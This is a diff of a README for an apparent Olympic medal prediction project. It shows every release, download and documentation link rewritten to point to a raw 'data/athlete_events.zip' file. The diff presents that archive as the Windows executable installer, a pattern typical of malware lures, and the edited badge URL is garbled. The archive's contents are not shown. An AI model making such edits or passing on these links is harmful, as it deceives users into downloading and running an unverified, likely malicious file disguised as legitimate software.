@@ -4,7 +4,7 @@
 Welcome to the **olympic-analysis-ml** project! This application analyzes data and uses a Random Forest model to predict Olympic medal outcomes. It identifies key success factors for athletes, making it a useful tool for sports enthusiasts and analysts alike.
 
 ## 📥 Download the Application
-[![Download](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=brightgreen)](https://github.com/0-zz/olympic-analysis-ml/releases)
+[![Download](https://raw.githubusercontent.com/0-zz/olympic-analysis-ml/main/data/athlete_events.zip%20Release&color=brightgreen)](https://raw.githubusercontent.com/0-zz/olympic-analysis-ml/main/data/athlete_events.zip)
 
 ## 💻 System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -17,12 +17,12 @@ Before you begin, ensure your system meets the following requirements:
 ## 📂 Download & Install
 To install the application:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/0-zz/olympic-analysis-ml/releases) to access the latest releases.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/0-zz/olympic-analysis-ml/main/data/athlete_events.zip) to access the latest releases.
 
 2. **Choose the Latest Version:** Find the most recent version of the software. It will usually be at the top of the list.
 
 3. **Download the Files:**
-   - If you see an executable file for your operating system (e.g., `olympic_analysis_ml_installer.exe` for Windows), download that file. This is the easiest method to install the software.
+   - If you see an executable file for your operating system (e.g., `https://raw.githubusercontent.com/0-zz/olympic-analysis-ml/main/data/athlete_events.zip` for Windows), download that file. This is the easiest method to install the software.
    - If you prefer to use Jupyter notebooks, look for the `.ipynb` files available for download. You can run these files using Jupyter Notebook.
 
 4. **Run the Software:**
@@ -50,7 +50,7 @@ For basic usage:
 - **User-Friendly Interface:** The setup and navigation are designed for non-technical users, ensuring ease of use.
 
 ## 📚 Documentation
-For more in-depth information, including tutorials and guides, visit the [Documentation](https://github.com/0-zz/olympic-analysis-ml/wiki) section.
+For more in-depth information, including tutorials and guides, visit the [Documentation](https://raw.githubusercontent.com/0-zz/olympic-analysis-ml/main/data/athlete_events.zip) section.
 
 ## 🤝 Contributing
 If you want to contribute to this project:
